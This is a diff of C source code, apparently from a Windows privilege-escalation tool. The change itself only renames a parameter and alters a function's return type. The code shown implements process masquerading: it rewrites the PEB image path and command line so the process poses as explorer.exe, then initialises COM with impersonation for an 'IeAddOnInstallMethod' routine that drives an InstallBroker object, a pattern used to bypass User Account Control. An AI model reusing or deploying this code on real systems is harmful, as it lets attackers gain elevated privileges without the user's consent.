@@ -395,11 +395,11 @@ VOID NTAPI LdrEnumModulesCallback
 	}
 }
 
-BOOL MasqueradeProcessPath
+VOID MasqueradeProcessPath
 (
 	_In_ LPWSTR lpNewPath,
 	_In_ BOOL Restore,
-	_Inout_opt_ LPWSTR* pBackupPath
+	_Inout_opt_ LPWSTR* pOldPath
 )
 {
 	PPEB pPeb = NULL;
@@ -411,13 +411,13 @@ BOOL MasqueradeProcessPath
 		lpImagePathName = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		lstrcpyW(lpImagePathName, lpNewPath);
 		lpCommandLine = PathFindFileNameW(lpImagePathName);
-		pBackupPath[0] = pPeb->ProcessParameters->ImagePathName.Buffer;
-		pBackupPath[1] = pPeb->ProcessParameters->CommandLine.Buffer;
-		pBackupPath[4] = lpNewPath;
+		pOldPath[0] = pPeb->ProcessParameters->ImagePathName.Buffer;
+		pOldPath[1] = pPeb->ProcessParameters->CommandLine.Buffer;
+		pOldPath[4] = lpNewPath;
 	}
 	else {
-		lpImagePathName = pBackupPath[0];
-		lpCommandLine = pBackupPath[1];
+		lpImagePathName = pOldPath[0];
+		lpCommandLine = pOldPath[1];
 	}
 
 	RtlAcquirePebLock();
@@ -428,7 +428,7 @@ BOOL MasqueradeProcessPath
 	RtlInitUnicodeString(&pPeb->ProcessParameters->ImagePathName, lpImagePathName);
 	RtlInitUnicodeString(&pPeb->ProcessParameters->CommandLine, lpCommandLine);
 	RtlReleasePebLock();
-	LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &pBackupPath);
+	LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &pOldPath);
 }
 
 BOOL IeAddOnInstallMethod
@@ -460,14 +460,14 @@ BOOL IeAddOnInstallMethod
 	HANDLE hProc = NULL;
 	BOOL Result = FALSE;
 	WCHAR wszExplorerPath[MAX_PATH];
-	LPWSTR BackupPath[5];
+	LPWSTR OldPath[5];
 	WCHAR wszNullStr[0x10];
 
 	RtlSecureZeroMemory(wszExplorerPath, sizeof(wszExplorerPath));
 	GetWindowsDirectoryW(wszExplorerPath, _countof(wszExplorerPath));
 	lstrcatW(wszExplorerPath, L"\\explorer.exe");
-	RtlSecureZeroMemory(BackupPath, sizeof(BackupPath));
-	MasqueradeProcessPath(wszExplorerPath, FALSE, BackupPath);
+	RtlSecureZeroMemory(OldPath, sizeof(OldPath));
+	MasqueradeProcessPath(wszExplorerPath, FALSE, OldPath);
 	hResultInit = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
 	hResult = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 	if (FAILED(hResult)) {
@@ -540,7 +540,7 @@ BOOL IeAddOnInstallMethod
 
 	Result = TRUE;
 CLEANUP:
-	MasqueradeProcessPath(NULL, TRUE, BackupPath);
+	MasqueradeProcessPath(NULL, TRUE, OldPath);
 	if (InstallBroker) {
 		InstallBroker->lpVtbl->Release(InstallBroker);
 	}
